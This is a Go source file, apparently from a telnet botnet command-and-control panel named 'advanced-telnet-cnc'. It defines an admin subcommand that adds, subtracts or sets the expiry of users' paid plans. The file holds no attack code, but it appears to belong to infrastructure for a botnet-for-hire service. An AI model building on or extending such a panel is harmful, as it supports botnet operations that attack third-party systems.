package subcommands

import (
	"advanced-telnet-cnc/packages/duration"
	"advanced-telnet-cnc/source/config"
	"advanced-telnet-cnc/source/database"
	"advanced-telnet-cnc/source/master/command"
	sessions "advanced-telnet-cnc/source/master/session"
	"advanced-telnet-cnc/source/master/termfx"
	"strconv"
	"strings"
	"time"
)

func init() {
	command.Subcommand("users", &command.SubCommand{
		Aliases:   []string{"expiry"},
		Arguments: []command.Argument{{"username", false}, {"add/subtract/set", false}, {"duration", false}},
		Executor: func(args []string, fx *termfx.TermFX, session *sessions.Session, parent *command.Command) error {
			if args[0] == "*" {
				users, err := database.Users()
				if err != nil {
					return session.CmdError(err)
				}

				var arg = args[1]
				args = args[1:]

				durationToAdd, err := duration.ModifiedParseDuration(strings.ReplaceAll(strings.Join(args, ""), "sec", "s"))
				if err != nil {
					return session.CmdError(err)
				}

				for _, profile := range users {
					switch arg {
					case "add":
						profile.Expiry = profile.Expiry.Add(durationToAdd)
						err = database.SetUser(profile)
						if err != nil {
							return session.CmdError(err)
						}

						session.Println(config.Green, "Successfully added ", duration.FormatDuration(durationToAdd)+" to ", strconv.Quote(profile.Name), "'s plan.")
					case "subtract":
						profile.Expiry = profile.Expiry.Add(-durationToAdd)
						err = database.SetUser(profile)
						if err != nil {
							return session.CmdError(err)
						}

						session.Println(config.Green, "Successfully subtracted ", duration.FormatDuration(durationToAdd), " from ", strconv.Quote(profile.Name), "'s plan.")
					}
				}
				return nil
			}

			profile, err := database.UserFromName(args[0])
			if err != nil || profile == nil {
				return err
			}

			switch args[1] {
			case "add":
				args = args[2:]
				parseDuration, err := duration.ModifiedParseDuration(strings.ReplaceAll(strings.Join(args, ""), "sec", "s"))
				if err != nil {
					return session.CmdError(err)
				}

				profile.Expiry = profile.Expiry.Add(parseDuration)
				err = database.SetUser(profile)
				if err != nil {
					return session.CmdError(err)
				}

				return session.Println(config.Green, "Successfully added ", duration.FormatDuration(parseDuration)+" to ", strconv.Quote(profile.Name), "'s plan.")
			case "subtract":
				args = args[2:]
				parseDuration, err := duration.ModifiedParseDuration(strings.ReplaceAll(strings.Join(args, ""), "sec", "s"))
				if err != nil {
					return session.CmdError(err)
				}

				profile.Expiry = profile.Expiry.Add(-parseDuration)
				err = database.SetUser(profile)
				if err != nil {
					return session.CmdError(err)
				}

				return session.Println(config.Green, "Successfully subtracted ", duration.FormatDuration(parseDuration), " from ", strconv.Quote(profile.Name), "'s plan.")
			case "set":
				args = args[2:]
				parseDuration, err := duration.ModifiedParseDuration(strings.ReplaceAll(strings.Join(args, ""), "sec", "s"))
				if err != nil {
					return session.CmdError(err)
				}

				profile.Expiry = time.Now().Add(parseDuration)
				err = database.SetUser(profile)
				if err != nil {
					return session.CmdError(err)
				}

				return session.Println(config.Green, "Successfully set the plan duration from ", strconv.Quote(profile.Name), " to ", duration.FormatDuration(parseDuration))
			}

			return command.ErrNotEnoughArguments
		},
	})
}
